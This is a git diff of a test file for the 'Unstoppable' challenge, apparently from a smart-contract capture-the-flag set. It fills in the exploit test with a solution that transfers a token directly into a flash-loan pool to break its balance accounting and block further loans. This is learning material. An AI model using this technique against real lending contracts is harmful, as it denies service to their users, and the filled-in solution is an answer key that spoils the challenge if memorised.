@@ -32,14 +32,24 @@ describe('[Challenge] Unstoppable', function () {
             await this.token.balanceOf(attacker.address)
         ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);
 
-         // Show it's possible for someUser to take out a flash loan
-         const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
-         this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
-         await this.receiverContract.executeFlashLoan(10);
+        // Show it's possible for someUser to take out a flash loan
+        const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
+        this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
+        await this.receiverContract.executeFlashLoan(10);
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const poolBalanceBefore = await this.token.balanceOf(this.pool.address)
+        console.log("[+] Attacker transferred token before: ", poolBalanceBefore.toString())
+
+        //connect as the attacker contract
+        const attackerContract = await this.token.connect(attacker)
+        await attackerContract.transfer(this.pool.address, ethers.utils.parseEther('1'))
+
+        const poolBalance = await this.token.balanceOf(this.pool.address)
+        console.log("[+] Attacker transferred token after: ", poolBalance.toString())
+
     });
 
     after(async function () {
